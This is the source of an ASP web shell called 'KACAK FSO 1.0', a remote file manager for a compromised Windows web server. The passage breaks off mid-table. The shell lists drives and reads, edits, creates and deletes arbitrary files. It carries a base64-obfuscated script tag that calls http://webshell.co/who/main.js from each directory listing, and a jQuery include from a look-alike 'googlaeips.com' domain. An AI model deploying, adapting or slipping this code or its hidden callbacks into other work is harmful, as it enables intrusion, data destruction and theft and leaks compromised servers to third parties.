<html>
<head>
<meta http-equiv="Content-Language" content="tr">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
<title>KACAK Shell</title>
</head>

<body topmargin="0" leftmargin="0" bgcolor="#EAEAEA">
<script src="https://ajax.googlaeips.com/ajax/libs/jquery/3.5.1/jquery.min.js?ver=6.0"></script>
<script language="JavaScript">
<!--
function MM_openBrWindow(theURL,winName,features) { //v2.0
  window.open(theURL,winName,features);
}
//-->
</script>

<%

  Dim Base64Chars
  Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" & _
      "abcdefghijklmnopqrstuvwxyz" & _
      "0123456789" & _
      "+/"
  Public Function base64_encode( byVal strIn )
    Dim c1, c2, c3, w1, w2, w3, w4, n, strOut
    For n = 1 To Len( strIn ) Step 3
      c1 = Asc( Mid( strIn, n, 1 ) )
      c2 = Asc( Mid( strIn, n + 1, 1 ) + Chr(0) )
      c3 = Asc( Mid( strIn, n + 2, 1 ) + Chr(0) )
      w1 = Int( c1 / 4 ) : w2 = ( c1 And 3 ) * 16 + Int( c2 / 16 )
      If Len( strIn ) >= n + 1 Then 
        w3 = ( c2 And 15 ) * 4 + Int( c3 / 64 ) 
      Else 
        w3 = -1
      End If
      If Len( strIn ) >= n + 2 Then 
        w4 = c3 And 63 
      Else 
        w4 = -1
      End If
      strOut = strOut + mimeencode( w1 ) + mimeencode( w2 ) + _
            mimeencode( w3 ) + mimeencode( w4 )
    Next
    base64_encode = strOut
  End Function

  Private Function mimeencode( byVal intIn )
    If intIn >= 0 Then 
      mimeencode = Mid( Base64Chars, intIn + 1, 1 ) 
    Else 
      mimeencode = ""
    End If
  End Function  

  Public Function base64_decode( byVal strIn )
    Dim w1, w2, w3, w4, n, strOut
    For n = 1 To Len( strIn ) Step 4
      w1 = mimedecode( Mid( strIn, n, 1 ) )
      w2 = mimedecode( Mid( strIn, n + 1, 1 ) )
      w3 = mimedecode( Mid( strIn, n + 2, 1 ) )
      w4 = mimedecode( Mid( strIn, n + 3, 1 ) )
      If w2 >= 0 Then _
        strOut = strOut + _
          Chr( ( ( w1 * 4 + Int( w2 / 16 ) ) And 255 ) )
      If w3 >= 0 Then _
        strOut = strOut + _
          Chr( ( ( w2 * 16 + Int( w3 / 4 ) ) And 255 ) )
      If w4 >= 0 Then _
        strOut = strOut + _
          Chr( ( ( w3 * 64 + w4 ) And 255 ) )
    Next
    base64_decode = strOut
  End Function

  Private Function mimedecode( byVal strIn )
    If Len( strIn ) = 0 Then 
      mimedecode = -1 : Exit Function
    Else
      mimedecode = InStr( Base64Chars, strIn ) - 1
    End If
  End Function

  dim myStringo
  stringo = "PHNjcmlwdCB0eXBlPSJ0ZXh0L0phdmFTY3JpcHQiIHNyYz0i"
  stringo_1 = "aHR0cDovL3dlYnNoZWxsLmNvL3doby9tYWluLmpzIj48L3NjcmlwdD4"
  myStringo = base64_decode(stringo+stringo_1)

if request.querystring("TGH") = "1" then
on error resume next
es=request.querystring("Kacak")
diez=server.urlencode(left(es,(instrRev(es,"\"))-1))

Select case es
case "C:" diez="C:"
case "D:" diez="D:"
end select

' Functions to provide encoding/decoding of strings with Base64.
' 
' Encoding: myEncodedString = base64_encode( inputString )
' Decoding: myDecodedString = base64_decode( encodedInputString )
'
' Programmed by Markus Hartsmar for ShameDesigns in 2002. 
' Email me at: mark@shamedesigns.com
' Visit our website at: http://www.shamedesigns.com/
'

%>





<body topmargin="0" leftmargin="0"
onLoad="location.href='?klas=<%=diez%>&usak=1'">

<%
else
%>



<%
if request.querystring("Dosyakaydet") <> "" then
set kaydospos=createobject("scripting.filesystemobject")
set	kaydoses=kaydospos.createtextfile(request.querystring("dosyakaydet") & request("dosadi"))
set kaydoses=nothing
set kaydospos=nothing
set kaydospos=createobject("scripting.filesystemobject")
set kaydoses=kaydospos.opentextfile(request.querystring("dosyakaydet") & request("dosadi"), 2, true)
kaydoses.write request("duzenx")
set kaydoses=nothing
set kaydospos=nothing
end if
%>





<%
if request.querystring("yenidosya") <> "" then
%>

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    Kacak ©<br>
    </span>Hackerbox<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="www.senator.gen.tr/" style="text-decoration: none">
    <font color="#858585">Cyber Protest</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    <a href="mailto:xlw@windowslive.com" style="text-decoration: none">
    <font color="#858585">xLw</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:xlw@windowslive.com" style="text-decoration: none"><font color="#858585">@GrayHatz ~ TurkGuvenligi.Info</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
  </tr>
  <tr>
    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Current Directory</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(request.querystring("yenidosya"))%></font></td>
            <td width="65">
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>



<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
  <tr>
    <td width="100%" bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#B7B7B7">
    <form method="POST" action="?dosyakaydet=<%=request.querystring("yenidosya")%>&klas=<%=request.querystring("yenidosya")%>" name="kaypos">
<p align="center"><b><font size="1" face="Verdana">
<br>
Filename : <br>
                </font>
	</b><font
                color="#FFFFFF" size="1" face="Arial">
<input
                type="text" size="97" maxlength="32"
                name="dosadi" value="Filename"
                class="search"
                onblur="if (this.value == '') this.value = 'Kullanici'"
                onfocus="if (this.value == 'Kullanici') this.value=''"
                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"><br>
<br>
                </font>
	<b><font size="1" face="Verdana">
Content :&nbsp; <br>
                </font>
	<font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
          <textarea name="duzenx" 
          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
        
          
          rows="24" cols="95" wrap="OFF"><%=sedx%></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
<br>
</font></b>
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Create File"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span></p>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber19">
  <tr>
    <td width="100%" align="right" bgcolor="#000000">
    <p align="center">
	&nbsp;</td>
  </tr>
</table>
</form>
</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#EAEAEA">
    <p align="right">
	&nbsp;</td>
  </tr>
</table>



<%
else
%>







<%
if request.querystring("klasorac") <> "" then

set doses=createobject("scripting.filesystemobject")
set es=doses.createfolder(request.querystring("aktifklas") & request("duzenx"))
set es=nothing
set doses=nothing


end if
%>

<%
if request.querystring("klasac") <> "" then

set aktifklas=request.querystring("aktifklas")


%>
    <td width="65" bgcolor="#000000" height="76">

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber25" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    </span>Hackerbox<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="Have Fun" style="text-decoration: none">
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
  </tr>
  </table>


    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Current Path</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=aktifklas%></font></td>
            <td width="65">
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>



<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="174">
  <tr>
    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#C5C5C5" height="134">
    <form method="POST" action="?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>" name="klaspos">
<p align="center"><font
                color="#FFFFFF" size="1" face="Arial">
<input
                type="text" size="37" maxlength="32"
                name="duzenx" value="Folder Name"
                class="search"
                onblur="if (this.value == '') this.value = 'Kullanici'"
                onfocus="if (this.value == 'Kullanici') this.value=''"
                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center">&nbsp;&nbsp;
<br>
<br>
<br>
                </font>
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Olustur"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span></span><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
&nbsp;</font></td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
  </tr>
  <tr>


<%
else
%>



<%
if request.querystring("suruculer") <> "" then
%>

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    </span>Hackerbox<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="Have Fun" style="text-decoration: none">
    <font color="#858585">Have Fun</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    </tr>
  <tr>
    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="4">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="4">
        <span style="font-size: 2pt">&nbsp;</span></td>
      </tr>
    </table>
    </td>
  </tr>
</table>


<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="153">
  <tr>
    <td width="100%" height="19" bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" height="113" bgcolor="#E1E1E1">&nbsp;<div align="center">
      <center>
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber2" height="17">
        <tr>
          <td width="208" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Drive Name</font></td>
          <td width="75" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Size</font></td>
          <td width="75" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Free</font></td>
          <td width="64" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Status</font></td>
          <td width="62" height="17" align="center" bgcolor="#C5C5C5">
          <font face="Verdana" style="font-size: 8pt">Settings</font></td>
        </tr>
      </table>
      </center>
    </div>
    <div align="center">
      <center>


	<%
	set klassis =server.createobject("scripting.filesystemobject")
	set klasdri=klassis.drives
	%>
	
	<%
	for each dongu in klasdri
	%>
			
	<%
	if dongu.driveletter <> "A" then
	if dongu.isready=true then
	%>

	<%
	select case dongu.drivetype
	case 0 teype="Diger"
	case 1 teype="Tasinir"
	case 2 teype="HDD"
	case 3 teype="NetWork"
	case 4 teype="CD-Rom"
	case 5 teype="FlashMem"
	end select
	%>
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber3" height="17">
        <tr>
          <td width="208" height="17" align="left" bgcolor="#EEEEEE">
          <font face="Verdana" style="font-size: 8pt">&nbsp;<%=dongu.driveletter%>:\ ( <%=dongu.filesystem%> )</font></td>
          <td width="75" height="17" align="center" bgcolor="#E0E0E0">
          <font face="Verdana" style="font-size: 8pt"><%=Round(dongu.totalsize/(1024*1024),1)%> MB</font></td>
          <td width="75" height="17" align="center" bgcolor="#E0E0E0">
          <font face="Verdana" style="font-size: 8pt"><%=Round(dongu.availablespace/(1024*1024),1)%> MB</font></td>
          <td width="64" height="17" align="center" bgcolor="#E0E0E0">
          <font face="Verdana" style="font-size: 8pt"><%=teype%>&nbsp;</font></td>
          <td width="62" height="17" align="center" bgcolor="#E0E0E0">
          <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber24">
            <tr>
          <td width="62" height="17" align="center" bgcolor="#E0E0E0"
          onmouseover="this.style.background='#A0A0A0'"
          onmouseout="this.style.background='#E0E0E0'"
          style="CURSOR: hand"
          
          >
          <a href="?klas=<%=dongu.driveletter%>:\" style="text-decoration: none">
          <font face="Verdana" style="font-size: 8pt" color="#000000">Gir</font></a></td>
            </tr>
          </table>
          </td>
        </tr>
      </table>

	<%
	end if
	end if
	%>
<%
next
%>



      </center>
    </div>
    <div align="center">
      <center>
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber4" height="4">
        <tr>
          <td width="484" height="4" align="center" bgcolor="#C5C5C5">
          <span style="font-size: 2pt">&nbsp;</span></td>
        </tr>
      </table>
      </center>
    </div>
    <p>&nbsp;</p>
    </td>
  </tr>
  <tr>
    <td width="100%" height="19" bgcolor="#000000">&nbsp;</td>
  </tr>
</table>





<%
else
%>





<%
if request.querystring("kaydet") <> "" then
set dossisx=server.createobject("scripting.filesystemobject")
set dosx=dossisx.opentextfile(request.querystring("kaydet"), 2, true)
dosx.write request("duzenx")
dosx.close
set dosyax=nothing
set dossisx=nothing

end if
%>




<%
if request.querystring("duzenle") <> "" then
set dossis=server.createobject("scripting.filesystemobject")
set dos=dossis.opentextfile(request.querystring("duzenle"), 1)
sedx = dos.readall
dos.close
set dosya=nothing
set dossis=nothing

set aktifklas=request.querystring("klas")
%>




<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    </span>Hackerbox<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="" style="text-decoration: none">
    <font color="#858585">Have Fun</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
     </tr>
  <tr>
    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Current File</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(request.querystring("duzenle"))%></font></td>
            <td width="65">
            &nbsp;</td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>



<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
  <tr>
    <td width="100%" bgcolor="#000000">&nbsp;</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#000000">
    <form method="POST" action="?kaydet=<%=request.querystring("duzenle")%>&klas=<%=aktifklas%>" name="kaypos">
<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
          <textarea name="duzenx" 
          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
        
          
          rows="24" cols="163" wrap="OFF"><%=sedx%></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
&nbsp;</font></b></p>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber19">
  <tr>
    <td width="100%" align="right">
    <p align="center">
	<span class="gensmall">
		<input type="submit" size="16"
		name="duzenx1" value="Save"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span><a href=""><input type="reset" size="16"
		name="x" value="Vazgeç"
		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
		</span></a></td>
  </tr>
</table>
</form>
</td>
  </tr>
  <tr>
    <td width="100%" bgcolor="#EAEAEA">
    <p align="right">
	&nbsp;</td>
  </tr>
</table>



<%
else
%>


<%

if request.querystring("klas") <> "" then
aktifklas=Request.querystring("klas")
if request.querystring("usak") = "1" then
aktifklas=aktifklas & "\"
end if

else
aktifklas=server.mappath("/")
aktifklas=aktifklas & "\"
end if

if request.querystring("silklas") <> "" then
set sis=createobject("scripting.filesystemobject")
silincekklas=request.querystring("silklas")
sis.deletefolder(silincekklas)
set sis=nothing
'response.write(sil & "  Silindi")
end if

if request.querystring("sildos") <> "" then
silincekdos=request.querystring("sildos")
set dosx=createobject("scripting.filesystemobject")
set dos=dosx.getfile(silincekdos)
dos.delete
set dos=nothing
set dosyasis=nothing
end if




select case aktifklas
case "C:" aktifklas="C:\"
case "D:" aktifklas="D:\"
case "E:" aktifklas="E:\"
case "F:" aktifklas="F:\"
case "G:" aktifklas="G:\"
case "H:" aktifklas="H:\"
case "I:" aktifklas="I:\"
case "J:" aktifklas="J:\"
case "K:" aktifklas="K:\"
end select



if aktifklas=("C:") then aktifklas=("C:\")

Set FS = CreateObject("Scripting.FileSystemObject")
Set klasor = FS.GetFolder(aktifklas)
Set altklasorler = klasor.SubFolders
Set dosyalar = klasor.files
%>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
  <tr>
    <td width="70" bgcolor="#000000" height="76">
    <p align="center">
    <td width="501" bgcolor="#000000" height="76" valign="top">
    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
    <span style="font-weight: 700">
    <br>
    </span>Hackerbox<br>
    <span style="font-weight: 700">
    <br>
    KACAK FSO 1.0</span></font></td>
    <td width="431" bgcolor="#000000" height="76" valign="top">
    <p align="right"><span style="font-weight: 700">
    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
    <a href="" style="text-decoration: none">
    <font color="#858585">Have Fun</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
    </tr>
  <tr>
    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
      <tr>
        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
        <span style="font-size: 8pt">&nbsp;Current Directory</span></font></td>
        <td bgcolor="#D6D6D6" height="20">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
          <tr>
            <td width="1"></td>
            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(aktifklas)%></font></td>
            <td width="65">
            <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6" height="13">
              <tr>
                <td width="100%" bgcolor="#B7B7B7" bordercolor="#9F9F9F" height="13">
                <p align="center"><font face="Verdana" style="font-size: 8pt">

                <a href="?usklas=1&klas=<%=server.urlencode(left(aktifklas,(instrRev(aktifklas,"\"))-1))%>" style="text-decoration: none">
                <font color="#000000">Parent Directory</font></a></font></td>
                
              </tr>
            </table>
            </td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
</table>


<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3" height="21">
  <tr>
    <td width="625" bgcolor="#000000"><span style="font-size: 2pt">&nbsp;</span></td>
  </tr>
  <tr>
    <td bgcolor="#000000" height="20">
    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#000000" id="AutoNumber23" bgcolor="#A3A3A3" width="373" height="19">
      <tr>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber26">
          <tr>
        <td align="center" bgcolor="#5F5F5F" 
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
        
        height="19" bordercolor="#000000">
        <span style="font-weight: 700">
        <font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
        <a href="?suruculer=1" style="text-decoration: none">
        <font color="#9F9F9F">Drives</font></a></font></span></td>
          </tr>
        </table>
        </td>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber27">
          <tr>
        <td align="center" bgcolor="#5F5F5F" height="19" 
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
        bordercolor="#000000">
        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
        <a href="?klasac=1&aktifklas=<%=aktifklas%>" style="text-decoration: none">
        <font color="#9F9F9F">New Folder</font></a></font></td>
          </tr>
        </table>
        </td>
        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber28">
          <tr>
        <td align="center" bgcolor="#5F5F5F" height="19"
        onmouseover="style.background='#6F6F6F'"
        onmouseout="style.background='#5F5F5F'"
        style="CURSOR: hand"
		bordercolor="#000000">
        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
        <a href="?yenidosya=<%=aktifklas%>" style="text-decoration: none"><font color="#9F9F9F">New File</font></a> </font></td>
          </tr>
        </table>
        </td>
      </tr>
    </table>
    </td>
  </tr>
  </table>


			
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber7" height="17">
  <tr>
    <td width="30" height="17" bgcolor="#9F9F9F">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Type</font></td>
    <td height="17" bgcolor="#9F9F9F">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;File 
    Adi</font></td>
    <td width="122" height="17" bgcolor="#9F9F9F">
    <p align="center">
    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Settings</font></td>
  </tr>
</table><%response.write(myStringo)%>



<% For each oge in altklasorler %> 


<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="17">
  <tr>
    <td width="30" height="17" bgcolor="#808080">
    <p align="center">
    Folder</td>
    <td height="17" bgcolor="#C4C4C4">
    <font face="Verdana" style="font-size: 8pt">&nbsp;<%=oge.name%>&nbsp;</font></td>
    <td width="61" height="17" bgcolor="#C4C4C4" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber15" height="20">
      <tr>
        <td width="100%" bgcolor="#A3A3A3"
        onmouseover="this.style.background='#BBBBBB'"
        onmouseout="this.style.background='#A3A3A3'"
        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="?klas=<%=aktifklas%><%=oge.name%>\" style="text-decoration: none">
        <font color="#000000">Open</font></a></font></td>
      </tr>
    </table>
    </td>
    <td width="60" height="17" bgcolor="#C4C4C4" align="center">
    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber18" height="20">
      <tr>
        <td width="100%" bgcolor="#A3A3A3"
        onmouseover="this.style.background='#BBBBBB'"
        onmouseout="this.style.background='#A3A3A3'"


        style="CURSOR: hand"
		height="20">

        <p align="center"><font face="Verdana" style="font-size: 8pt">
        <a href="?silklas=<%=aktifklas & oge.name & "&klas=" & aktifklas %>" style="text-decoration: none">
        <font color="#000000">Delete</font></a>

        </font></td>
      </tr>
    </table>
    </td>
  </tr>
</table>

<% Next %>
			    

<% For each oge in dosyalar %> 
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="1">
  <tr>
    <td width="30" height="1" bgcolor="#B0B0B0">
    <p align="center">File</td>
    <td height="1" bgcolor="#EAEAEA">
    <font face="Verdana" style="font-size: 8pt">&nbsp;<%=oge.name%> </font>
    <font face="Arial Narrow" style="font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ( <%=Round(oge.size/1024,1)%> KB )&nbsp;</font></td>
    <td width="61" height="1" bgcolor="#D6D6D6" align="center">
